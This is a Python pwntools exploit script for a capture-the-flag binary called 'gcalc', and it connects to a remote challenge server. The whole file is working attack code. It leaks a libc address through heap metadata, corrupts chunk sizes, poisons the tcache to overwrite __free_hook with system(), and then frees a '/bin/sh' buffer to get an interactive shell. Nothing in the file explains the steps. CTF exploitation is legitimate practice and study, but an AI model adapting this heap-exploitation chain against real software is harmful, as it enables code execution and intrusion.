#!/usr/bin/env python3

from pwn import *

exe = ELF("./gcalc")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})

i = 1

def alloc(r, size):
    global i
    r.sendlineafter("> ", "1")
    r.recvline()
    r.sendline(str(i))
    r.recvline()
    r.sendline(str(size))
    i+=1


def fill(r, idx, new_size, grades):
    r.sendlineafter("> ", "2")
    r.recvline()
    r.sendline(str(idx))
    
    for _ in range(3):
        r.recvline()

    r.sendline(str(new_size))


    if grades:
        for i in grades:
            r.recvline()
            r.sendline(str(i))



def main():
    #r = conn()
    r = remote("challenges.ctfd.io", 30253)
    
    alloc(r, 0x440)
    alloc(r, 0x20)
    fill(r, 1, 1, b"M"*2)
    alloc(r, 0x18)


    r.sendlineafter("> ", "3")
    r.recvuntil("Category #3:")
    r.recvuntil("Grades: ")
    leak = r.recvline()
    leak = leak.split(b', ')

    LIBC_LEAK = b""
    for i in range(6):
        LIBC_LEAK += p8(int(leak[i]) & 0xff)

    LIBC_LEAK = u64(LIBC_LEAK.ljust(8, b"\x00"))
    log.warn("LIBC LEAK @ 0x%x", LIBC_LEAK)

    libc.address = LIBC_LEAK - libc.sym['main_arena'] - 96
    

    for _ in range(3):
        alloc(r, 0x10)


    fill(r, 3, 0, b"\x00"*0x18 + p8(0x41))
    fill(r, 4, 0x40, b"\x00"*0x41)


    fill(r, 5, 0x40, b"\x00"*0x41) # fill is used as free.
    alloc(r, 0x30) # it was just 0x10

    fill(r, 7, 0x0, b"\x00"*0x18 + p64(0x21) + p64(libc.sym['__free_hook']-8) + p64(0) + b"\x00")
    

    alloc(r, 0x10)
    alloc(r, 0x10)

    fill(r, 9, 0, b"/bin/sh\x00" + p64(libc.sym['system']) + b"\x00")

    fill(r, 9, 1, "")
    


    r.interactive()


if __name__ == "__main__":
    main()
